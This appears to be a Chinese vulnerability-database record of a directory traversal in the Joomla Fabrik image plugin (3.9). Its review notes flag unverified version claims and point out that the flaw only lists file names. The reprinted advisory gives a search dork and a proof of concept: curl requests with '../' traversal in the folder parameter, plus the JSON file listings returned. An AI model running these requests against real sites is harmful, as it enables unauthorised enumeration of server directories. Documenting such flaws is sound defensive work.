---
source: "hatch 补库批 20260928"
product: "Joomla Fabrik image element plugin"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla! com_fabrik 3.9.11 目录遍历漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：安装com_fabrik相关image插件；folder路径服务账号可读"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-d470b17b8fddd20add817341"
entity_id: "ve-d470b17b8fddd20add817341"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：安装com_fabrik相关image插件；folder路径服务账号可读

- **事实待核（1）**：标题3.9.11与影响Version3.9不清谁是Joomla版本谁是Fabrik版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **证据待核（2）**：响应只是图片文件名目录列表，不证明文件内容读取；不可泛化任意文件读。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（3）**：原始披露/源码缺，需分离插件与核心版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Joomla! com\_fabrik 3.9.11 目录遍历漏洞

一、漏洞简介
------------

关键字:inurl:\"index.php?option=com\_fabrik\"

二、漏洞影响
------------

Version: 3.9

三、复现过程
------------

### poc

    $> curl -X GET -i "http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/"
    ...snip...
    [{"value":"eila.jpg","text":"eila.jpg","disable":false},{"value":"eilanya.jpg","text":"eilanya.jpg","disable":false},{"value":"topsecret.png","text":"topsecret.png","disable":false}]
    ...snip...
    $> curl -X GET -i "http://www.0-sec.org/joomla/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../home/user123/Pictures/"
    ...snip...
    [{"value":"Revision2017_Banner.jpg","text":"Revision2017_Banner.jpg","disable":false},{"value":"Screenshot from 2019-02-23 22-43-54.png","text":"Screenshot from 2019-02-23 22-43-54.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-22.png","text":"Screenshot from 2019-03-09 14-59-22.png","disable":false},{"value":"Screenshot from 2019-03-09 14-59-25.png","text":"Screenshot from 2019-03-09 14-59-25.png","disable":false},{"value":"Screenshot from 2019-03-16 23-17-05.png","text":"Screenshot from 2019-03-16 23-17-05.png","disable":false},{"value":"Screenshot from 2019-03-18 07-30-41.png","text":"Screenshot from 2019-03-18 07-30-41.png","disable":false},{"value":"Screenshot from 2019-03-18 08-23-45.png","text":"Screenshot from 2019-03-18 08-23-45.png","disable":false},{"value":"Screenshot from 2019-04-08 00-09-36.png","text":"Screenshot from 2019-04-08 00-09-36.png","disable":false},{"value":"Screenshot from 2019-04-08 10-34-23.png","text":"Screenshot from 2019-04-08 10-34-23.png","disable":false},{"value":"Screenshot from 2019-04-13 08-23-48.png","text":"Screenshot from 2019-04-13 08-23-48.png","disable":false},{"value":"Screenshot from 2019-05-24 23-14-05.png","text":"Screenshot from 2019-05-24 23-14-05.png","disable":false},{"value":"b.jpg","text":"b.jpg","disable":false},{"value":"by_gh0uli.tumblr.com-8755.png.jpeg","text":"by_gh0uli.tumblr.com-8755.png.jpeg","disable":false},{"value":"max_payne_06.jpg","text":"max_payne_06.jpg","disable":false},{"value":"xxx.jpg","text":"xxx.jpg","disable":false}]
    ...snip...
